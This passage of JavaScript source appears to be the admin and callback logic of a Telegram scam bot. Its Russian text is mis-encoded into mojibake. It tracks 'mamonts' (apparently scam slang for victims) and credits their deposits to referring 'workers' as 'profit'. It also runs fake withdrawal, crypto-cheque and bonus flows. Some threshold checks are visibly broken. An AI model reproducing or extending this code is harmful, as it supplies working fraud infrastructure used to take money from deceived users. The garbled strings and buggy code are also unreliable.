			if(!message.text) return message.send(`–°—É–º–º–∞ –ø–ª–∞—Ç–µ–∂–∞?`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setpay")[1]) });
			if(!user) return;

			await message.user.set("menu", "");
            let ref		=		await User.findOne({ id: user.ref });
await User.findOneAndUpdate({ id: ref.id }, { $inc: { epv: message.text } })
bot.sendMessage(user.id, `‚úÖ –í—ã <b>—É—Å–ø–µ—à–Ω–æ</b> –ø–æ–ø–æ–ª–Ω–∏–ª–∏ –±–∞–ª–∞–Ω—Å –Ω–∞ <b>${message.text}</b> <b>RUB.`, {
    parse_mode: "HTML"
   });
   await User.findOneAndUpdate({ id: user.id }, { $inc: { balance: message.text} })
	await message.send(`üí∏ –£—Å–ø–µ—à–Ω—ã–π –ø—Ä–æ—Ñ–∏—Ç!
    –º–∞–º–æ–Ω—Ç @ <a href="tg://user?id=${user.id}">id${user.id}</a> –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ ${message.text}
    –í–æ—Ä–∫–µ—Ä: @ <a href="tg://user?id=${ref.id}">id${ref.id}</a>`, {
        parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
				
			});
            bot.sendMessage(ref.id, `üí∏ –£—Å–ø–µ—à–Ω—ã–π –ø—Ä–æ—Ñ–∏—Ç!
            –º–∞–º–æ–Ω—Ç @ <a href="tg://user?id=${user.id}">id${user.id}</a> –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ ${message.text}
            –í–æ—Ä–∫–µ—Ä: @ <a href="tg://user?id=${ref.id}">id${ref.id}</a>`, {
                parse_mode: "HTML"
               });
		}

if(message.user.menu === "dostup") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let user			=		await User.findOne({ id: message.text });
			await User.findOneAndUpdate({ id: user.id }, { $inc: { inv: 50 } })
				await message.user.set("menu", "");

				return message.send(`–î–æ—Å—Ç—É–ø –≤—ã–¥–∞–Ω.`);
			}

		if(message.user.menu === "enterId") {
			message.text = Number(message.text);
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º –∞–π–¥–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω.`);

			let refs		=		await User.find({ ref: message.text });
			message.send(`üÜî <a href="tg://user?id=${message.text}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>: 

‚ñ™Ô∏è –ë–∞–ª–∞–Ω—Å: <b>${user.balance.toFixed(2)}</b>‚ÇΩ
‚ñ™Ô∏è –ú–∞–º–æ–Ω—Ç–æ–≤: <b>${user.part}</b> —á–µ–ª.
‚ñ™Ô∏è –ó–∞—Ä–∞–±–æ—Ç–∞–ª —Å –º–∞–º–æ–Ω—Ç–æ–≤: <b>${user.epv.toFixed(2)}</b>‚ÇΩ `, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});

			message.user.set("menu", "");
		}
		if(message.user.menu === "testid") {
			message.text = Number(message.text);
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`);

			
			
			message.send(`üÜî <a href="tg://user?id=${message.text}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>: `, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});

			message.user.set("menu", "");
		}
		if(message.user.menu === "ban") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let ban			=		await Ban.findOne({ id: message.text });
			if(ban) {
				await ban.remove();
				await message.user.set("menu", "");

				return message.send(`–ë–∞–Ω —Å–Ω—è—Ç.`);
			} else {
				let _ban = new Ban({
					id: message.text
				});

				await _ban.save();
				await message.user.set("menu", "");

				return message.send(`–ë–∞–Ω –≤—ã–¥–∞–Ω.`);
			}
		}

if(message.user.menu === "dostup") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let user			=		await User.findOne({ id: message.text });
			await User.findOneAndUpdate({ id: user.id }, { $inc: { inv: 50 } })
				await message.user.set("menu", "");

				return message.send(`–î–æ—Å—Ç—É–ø –≤—ã–¥–∞–Ω.`);
			}

		if(message.text === "/ban") {
			await message.user.set("menu", "ban");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		
		if(message.text === "/post") {
			await message.user.set("menu", "post");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø–æ—Å—Ç–∞`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		} 
		
		if(message.text === "/newday") {
		var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0');
let counters = {
   users: await User.countDocuments(),
   users_today: await User.find({ regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}` }),
  }
  counters.users_today  =  counters.users_today.length;
await Stats.findOneAndUpdate({ id: `${dd}.${mm}` }, { $set: { user: counters.users_today } })
let schema = {
			id: `${dd+1}.${mm}`,
            inv: 0,
			viv: 0,
			suminv: 0,
			sumviv: 0,
			user: 0
		}
			let stat = new Stats(schema);
		await stat.save();
		}
		if(message.text === "/info") {
			var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0');

let userList = await User.find();
let stat = await Stats.findOne({ id: `${dd}.${mm}` });
			let bal = 0;
await userList.map(async (x) => {
	  bal += x.balance
	}) 
	
	let statList = await Stats.find();
			let inv = 0;
			let viv = 0;
			let suminv = 0;
			let sumviv = 0;
await statList.map(async (x) => {
	inv += x.inv
	viv += x.viv
	suminv += x.suminv
	sumviv += x.sumviv
	}) 
  let counters = {
   users: await User.countDocuments(),
   users_today: await User.find({ regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}` }),
  }
  
  let statsuminv = Number(stat.suminv)
  let statsumviv = Number(stat.sumviv)

  counters.users_today  =  counters.users_today.length;
		return message.send(`‚ÑπÔ∏è <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–µ–∫—Ç–∞ –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è:</b>

‚ûñ –ë–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: <b>${(bal).toFixed(2)}‚ÇΩ</b>
‚ûñ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π: <b>${inv}</b>
‚ûñ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—ã–≤–æ–¥–æ–≤: <b>${viv}</b>
‚ûñ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π: <b>${suminv.toFixed(2)}‚ÇΩ</b>
‚ûñ –°—É–º–º–∞ –≤—ã–≤–æ–¥–æ–≤: <b>${sumviv.toFixed(2)}‚ÇΩ</b>
‚ûñ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: <b>${counters.users}</b>

üìà <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–µ–∫—Ç–∞ –∑–∞ ${dd}.${mm}:</b>

‚ûñ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π: <b>${stat.inv}</b>
‚ûñ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—ã–≤–æ–¥–æ–≤: <b>${stat.viv}</b>
‚ûñ –°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π: <b>${statsuminv.toFixed(2)}‚ÇΩ</b>
‚ûñ –°—É–º–º–∞ –≤—ã–≤–æ–¥–æ–≤: <b>${statsumviv.toFixed(2)}‚ÇΩ</b>
‚ûñ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: <b>${counters.users_today}</b>
`, { 
			parse_mode: "HTML"
		});
		} 
		
	
		
				if(message.text === "‚úÖ –î–æ—Å—Ç—É–ø") {
			await message.user.set("menu", "dostup");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		if(message.text === "üí∏ –ë–∞–ª–∞–Ω—Å") {
			await message.user.set("menu", "enterIdBalance");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
				if(message.text === "üí≥ –ò–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏") {
			await message.user.set("menu", "enterIdInBalance");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text === "üÜî –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è") {
			await message.user.set("menu", "enterId");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		
		if(message.text === "/id") {
			await message.user.set("menu", "testid");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		
		if(message.text === "üßç –†–∞—Å—Å—ã–ª–∫–∞") {
			await message.user.set("menu", "selectAuditory");
			return message.send(`–í—ã–±–µ—Ä–∏—Ç–µ –∞—É–¥–∏—Ç–æ—Ä–∏—é.

0.25	‚Äî	25%
0.50	‚Äî	50%
0.75	‚Äî	75%
1		‚Äî	100%`, {
				reply_markup: {
					keyboard: [["0.25", "0.50"], ["0.75", "1"], ["‚õîÔ∏è –û—Ç–º–µ–Ω–∞"]],
					resize_keyboard: true
				}
			});
		}

		if(message.text === "/admin") return message.send(`–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å.`, {
			reply_markup: {
				keyboard: keyboards.admin,
				resize_keyboard: true
			}
		});
	}
});

bot.on("callback_query", async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });

	let ban = await Ban.findOne({ id: message.user.id });
	if (ban) return bot.answerCallbackQuery(query.id, "–ó–∞–±–∞–Ω–µ–Ω!", true);

	if (query.data.startsWith("viv")) {
	let plat		= (query.data.split("_")[1])
	let sbor = ``;
	let p = ``;
 if(plat == `qiwi`) { 
 if(message.user.balance < 50) return bot.answerCallbackQuery(query.id, 'üö® –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: 50‚ÇΩ', true);
 sbor = `Qiwi –ö–æ—à–µ–ª—ë–∫`, p = `–∫–æ—à–µ–ª—å–∫–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ 79XXXXXXXXX` }
            else if (plat == `kart`) {
if(message.user.balance < 50) return bot.answerCallbackQuery(query.id, 'üö® –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: 50‚ÇΩ', true);
				sbor = `–ë–∞–Ω–∫–æ–≤—Å–∫–∞—è –∫–∞—Ä—Ç–∞`, p = `–∫–∞—Ä—Ç—ã –∏ –±–∞–Ω–∫` }
			else if (plat == `money`) { sbor = `–ÆMoney –ö–æ—à–µ–ª—ë–∫` , p = `–∫–æ—à–µ–ª—å–∫–∞`}
			else if (plat == `payeer`) {
 if(message.user.balance < 50) return bot.answerCallbackQuery(query.id, 'üö® –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: 50‚ÇΩ', true);
				sbor = `Payeer –ö–æ—à–µ–ª—ë–∫` , p = `–∫–æ—à–µ–ª—å–∫–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ PXXXXXXXX`}
	bot.deleteMessage(message.chat.id, message.message_id)
	 bot.sendMessage(message.chat.id,`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä ${p} :`, {
			reply_markup: {
				keyboard: keyboards.cancel,
				resize_keyboard: true
			}
		});
        await message.user.set("menu", "qiwi_" + sbor);
		console.log(message.user.menu)
}
if(query.data.startsWith("kak")) {
		bot.deleteMessage(message.chat.id, message.message_id)
		bot.sendMessage(message.chat.id,`‚Å†‚Å†‚ñ™ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ —Ä–∞—Å—Å—á–∏—Ç–∞—Ç—å:`, {
		});
		await message.user.set("menu", "kak");
		
		}
		
		if(query.data.startsWith("send")) {
		
		if (message.user.send == 0) { bot.answerCallbackQuery(query.id, "üîî –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤—ã–∫–ª.");
		await message.user.set("send", 1); 
		}
		if (message.user.send == 1) { bot.answerCallbackQuery(query.id, "üîî –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤–∫–ª.",true);
		await message.user.set("send", 0); 
		}
		}
		
		if(query.data.startsWith("calc")) {
				bot.sendMessage(message.user.id,`‚Å†‚Å†‚ñ™ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ —Ä–∞—Å—Å—á–∏—Ç–∞—Ç—å:`, {
		});

		await User.updateOne({ id: message.user.id }, { $set: { menu : `calc` } } )
	}
		
		if(query.data.startsWith("pod")) {
			bot.deleteMessage(message.chat.id, message.message_id)
			if(message.user.pod == 1) {
				return bot.sendMessage(message.user.id,`üö® <b>–í—ã —É–∂–µ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É</b>`, {
					parse_mode: "HTML"
				})
			}
            var result = randomInteger(100000, 999998)
await bot.sendMessage(message.user.id,`–î–ª—è –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞ —Ä–æ–±–æ—Ç–∞ –ø—Ä–∏—à–ª–∏—Ç–µ —Ç–µ–∫—Å—Ç: 
<b>${result}</b>`, {
parse_mode: "HTML"
		})
		await User.updateOne({ id: message.user.id }, { $set: { menu : `verif_${result}` } } )
		}

		if(query.data.startsWith("gift")) {
							
			bot.deleteMessage(message.chat.id, message.message_id)
		
		return bot.sendMessage(message.chat.id,`üí∞ <b>–ü–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ —á–µ–∫–∏
  
–ü–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–π —á–µ–∫ (–ø–µ—Ä–µ–≤–æ–¥)</b> - <i>–ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –º–æ–Ω–µ—Ç—ã –æ–¥–Ω–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é. –¢–∞–∫–∂–µ –í—ã –º–æ–∂–µ—Ç–µ –∑–∞–∫—Ä–µ–ø–∏—Ç—å —á–µ–∫ –∑–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, —á—Ç–æ–±—ã —Ç–æ–ª—å–∫–æ –æ–Ω —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å –í–∞—à –ø–µ—Ä–µ–≤–æ–¥.</i>`, {
		reply_markup: {
				inline_keyboard: [
					[{ text: "–°–æ–∑–¥–∞—Ç—å", callback_data: `sogift` }],
		[{ text: "< –ù–∞–∑–∞–¥", callback_data: `check` }],
				]
			},
		parse_mode: "HTML"
		});
		}

		if(query.data.startsWith("sogift")) {
							
			bot.deleteMessage(message.chat.id, message.message_id)
		
		return bot.sendMessage(message.chat.id,`–í—ã–±–µ—Ä–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å –ø–æ–º–æ—â—å—é —á–µ–∫–∞.`, {
		reply_markup: {
				inline_keyboard: [
					[{ text: "USDT", callback_data: `bgift_usdt` },{ text: "TON", callback_data: `bgift_ton` },{ text: "BTC", callback_data: `bgift_btc` }],
					[{ text: "ETH", callback_data: `bgift_eth` },{ text: "BNB", callback_data: `bgift_bnb` },{ text: "BUSD", callback_data: `bgift_busd` }],
		[{ text: "< –ù–∞–∑–∞–¥", callback_data: `gift` }],
				]
			},
		parse_mode: "HTML"
		});
		}

		if(query.data.startsWith("bgift")) {

			let crypto		= (query.data.split("_")[1])	
			if(crypto == `usdt`) {
            if(message.user.usdt < 0.1) {
				return bot.answerCallbackQuery(query.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–æ–Ω–µ—Ç. –°—É–º–º–∞ –æ–¥–Ω–æ–≥–æ —á–µ–∫–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ —á–µ–º $0.1. –°–Ω–∞—á–∞–ª–∞ –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å.",true);
			}
			bot.sendMessage(message.chat.id,`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É USDT –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.usdt} USDT`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_usdt" } }) 
			}
			if(crypto == `ton`) {
				if(message.user.ton < 0.05) {
					return bot.answerCallbackQuery(query.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–æ–Ω–µ—Ç. –°—É–º–º–∞ –æ–¥–Ω–æ–≥–æ —á–µ–∫–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ —á–µ–º $0.1. –°–Ω–∞—á–∞–ª–∞ –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å.",true);
				}
				bot.sendMessage(message.chat.id,`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É TON –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.ton} TON`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_ton" } }) 
			}
			if(crypto == `btc`) {
				if(message.user.btc < 0,0o5) {
					return bot.answerCallbackQuery(query.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–æ–Ω–µ—Ç. –°—É–º–º–∞ –æ–¥–Ω–æ–≥–æ —á–µ–∫–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ —á–µ–º $0.1. –°–Ω–∞—á–∞–ª–∞ –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å.",true);
				}
				bot.sendMessage(message.chat.id,`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BTC –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.btc} BTC`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_btc" } }) 
			}
			if(crypto == `eth`) {
				if(message.user.eth < 0,0o65) {
					return bot.answerCallbackQuery(query.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–æ–Ω–µ—Ç. –°—É–º–º–∞ –æ–¥–Ω–æ–≥–æ —á–µ–∫–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ —á–µ–º $0.1. –°–Ω–∞—á–∞–ª–∞ –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å.",true);
				}
				bot.sendMessage(message.chat.id,`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É ETH –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.eth} ETH`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_eth" } }) 
			}
			if(crypto == `bnb`) {
				if(message.user.bnb < 0,0o33) {
					return bot.answerCallbackQuery(query.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–æ–Ω–µ—Ç. –°—É–º–º–∞ –æ–¥–Ω–æ–≥–æ —á–µ–∫–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ —á–µ–º $0.1. –°–Ω–∞—á–∞–ª–∞ –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å.",true);
				}
				bot.sendMessage(message.chat.id,`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BNB –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.bnb} BNB`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_bnb" } }) 
			}
			if(crypto == `busd`) {
				if(message.user.d < 0.1) {
					return bot.answerCallbackQuery(query.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–æ–Ω–µ—Ç. –°—É–º–º–∞ –æ–¥–Ω–æ–≥–æ —á–µ–∫–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ —á–µ–º $0.1. –°–Ω–∞—á–∞–ª–∞ –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å.",true);
				}
				bot.sendMessage(message.chat.id,`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BUSD –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.busd} BUSD`);
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift_busd" } }) 
			}
		}

		if(query.data.startsWith("tyhtrugift")) {
			bot.deleteMessage(message.chat.id, message.message_id)
	if(message.user.balance < 0.1) {
	return bot.sendMessage(message.chat.id,`–ù–∞ –≤–∞—à–µ–º –±–∞–ª–∞–Ω—Å–µ –º–µ–Ω—å—à–µ 0.1 TON`);
			}
		 bot.sendMessage(message.chat.id,`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É TON –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.balance} TON`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
	
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "gift" } }) 
			} 
		
		if(query.data.startsWith("bonus")) {
			bot.deleteMessage(message.chat.id, message.message_id)
			if(message.user.bonusTimer == 1) {
				return bot.sendMessage(message.user.id,`üö® <b>–í—ã —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏ –±–æ–Ω—É—Å</b>`)
			}
	if ((await bot.getChatMember("@LXFinanceNews", message.chat.id)).status == "left") {
await bot.sendMessage(message.user.id,`<b>‚ñ™Ô∏è –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–Ω—É—Å–∞ 3‚ÇΩ, –ø—Ä–æ–π–¥–∏—Ç–µ –Ω–µ–±–æ–ª—å—à—É—é –ø—Ä–æ–≤–µ—Ä–∫—É, –ø—Ä–æ—Å—Ç–æ –≤—Å—Ç—É–ø–∏—Ç–µ –≤ —á–∞—Ç –∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å.

¬©Ô∏è –ù–∞–∂–º–∏—Ç–µ –Ω–∞ ¬´–ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è 1¬ª</b>`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
					   [
					   { text: "‚ûï –ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ —á–∞—Ç", url: `https://t.me/LXFinanceChat` },
							],
							[
       { text: "‚úÖ –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å", callback_data: `bonus` },
							],
						],
						
			},
				})
				return bot.sendMessage(message.user.id,`üö® <b>–í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–ª–∏—Å—å –Ω–∞ —á–∞—Ç</b>`, {
			parse_mode: "HTML"
		})
		}
		
		await bot.sendMessage(message.user.id, `
¬©Ô∏è –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.`, {
	reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}, 
parse_mode: "HTML"
}) 
await User.updateOne({ id: message.user.id }, { $set: { bonusTimer : 1 } } )
		}

		if(query.data.startsWith("menu")) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
			bot.deleteMessage(message.chat.id, message.message_id)

		return bot.sendMessage(message.user.id, `
        ‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

        ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
        ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
        ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
